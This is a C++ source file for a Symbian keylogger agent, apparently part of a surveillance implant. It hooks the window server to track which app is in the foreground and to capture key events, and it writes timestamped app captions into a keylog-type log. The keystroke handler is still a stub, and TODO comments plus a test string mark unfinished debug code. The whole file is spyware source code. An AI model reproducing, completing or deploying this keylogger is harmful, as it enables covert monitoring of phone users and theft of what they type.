/*
 * AgentKeyLog.cpp
 *
 *  Created on: 08/giu/2011
 *      Author: Giovanna
 */

#include "AgentKeylog.h"


CAgentKeylog::CAgentKeylog() :
	CAbstractAgent(EAgent_Keylog)
	{
	// No implementation required
	}

CAgentKeylog::~CAgentKeylog()
	{
	__FLOG(_L("Destructor"));
	
	delete iFgMonitor;
	delete iKeyLogger;
	iWsSession.Close();
	
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentKeylog* CAgentKeylog::NewLC(const TDesC8& params)
	{
	CAgentKeylog* self = new (ELeave) CAgentKeylog();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentKeylog* CAgentKeylog::NewL(const TDesC8& params)
	{
	CAgentKeylog* self = CAgentKeylog::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentKeylog::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN("HT", "Agent_Keylog.txt");
	__FLOG(_L("-------------"));
		
	BaseConstructL(params);
	
	iWsSession.Connect();
	iFgMonitor = CForegroundMonitor::NewL(iWsSession,*this);
	iKeyLogger = CKeyLogger::NewL(*this);
	}

void CAgentKeylog::StartAgentCmdL()
	{
	//__FLOG(_L("StartAgentCmdL()"));
	
	CreateLogL(LOGTYPE_KEYLOG);
	
	//retrieve current task in foreground and initialize iAppUid,iCaption
	TInt wgId = iWsSession.GetFocusWindowGroup();
	CApaWindowGroupName* wgName = CApaWindowGroupName::NewLC(iWsSession, wgId);
	TApaTaskList* taskList = new (ELeave) TApaTaskList(iWsSession);
	CleanupStack::PushL(taskList);
	TApaTask app =  taskList->FindByPos(0); 
	iCaption.Copy(wgName->Caption());
	iAppUid = wgName->AppUid();
	CleanupStack::PopAndDestroy(2); //taskList,wgName
	
	//TODO: just of test
	HBufC8* tmp = GetHeaderBufferL(iCaption);
	CleanupStack::PushL(tmp);
	TInt value;
	RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
	if(value)
		{
		if(tmp->Des().Length()>0)
			{
			AppendLogL(*tmp);
			}
		}
	CleanupStack::PopAndDestroy(tmp);
	//end of test	
	
	iFgMonitor->Listen();
	iKeyLogger->Listen();
	}

void CAgentKeylog::StopAgentCmdL()
	{
	//__FLOG(_L("StopAgentCmdL()"));
	iFgMonitor->Cancel();
	iKeyLogger->Cancel();
	CloseLogL();
	}

void CAgentKeylog::ForegroundEventL(TUid aAppUid, const TDesC& aCaption)
	{
	//TODO: finish this with real keylog 
	// we often receive two equal events in sequence, so we have to check
	if(iAppUid == aAppUid)
		{
		//do nothing
		}
	else
		{
		iAppUid = aAppUid;
		iCaption.Copy(aCaption);
		//TODO: just for test
		HBufC8* tmp = GetHeaderBufferL(aCaption);
		CleanupStack::PushL(tmp);
		TInt value;
		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
		if(value)
			{
			if(tmp->Des().Length()>0)
				{
				AppendLogL(*tmp);
				}
			}
		CleanupStack::PopAndDestroy(tmp);
		//end of test
		}
	
	}

HBufC8* CAgentKeylog::GetHeaderBufferL(const TDesC& aCaption)
	{
	_LIT(KTest,"This is just a test!");  // TODO: delete when done
	
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);

	TUint16 null = 0;
	TUint32 delimiter = LOG_DELIMITER;

	// get timestamp
	TTimestamp tstamp;
	TimeUtils::GetTimestamp(&tstamp);
		
	buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));
	buffer->InsertL(buffer->Size(),&tstamp,sizeof(TTimestamp));
	buffer->InsertL(buffer->Size(),aCaption.Ptr(),aCaption.Size());
	buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));
	buffer->InsertL(buffer->Size(),aCaption.Ptr(),aCaption.Size());
	buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));
	buffer->InsertL(buffer->Size(),(TUint8 *)&delimiter,sizeof(TUint32));
	buffer->InsertL(buffer->Size(),KTest().Ptr(),KTest().Size());   // TODO: delete when done
		
	HBufC8* result = buffer->Ptr(0).AllocL();
	
	CleanupStack::PopAndDestroy(buffer);
	return result;
	}

TBool CAgentKeylog::KeyCapturedL(TWsEvent aEvent)
	{
	TKeyEvent *keyEvent;
	keyEvent = aEvent.Key();
	TUint code = keyEvent->iCode;
	
	return ETrue;
	}
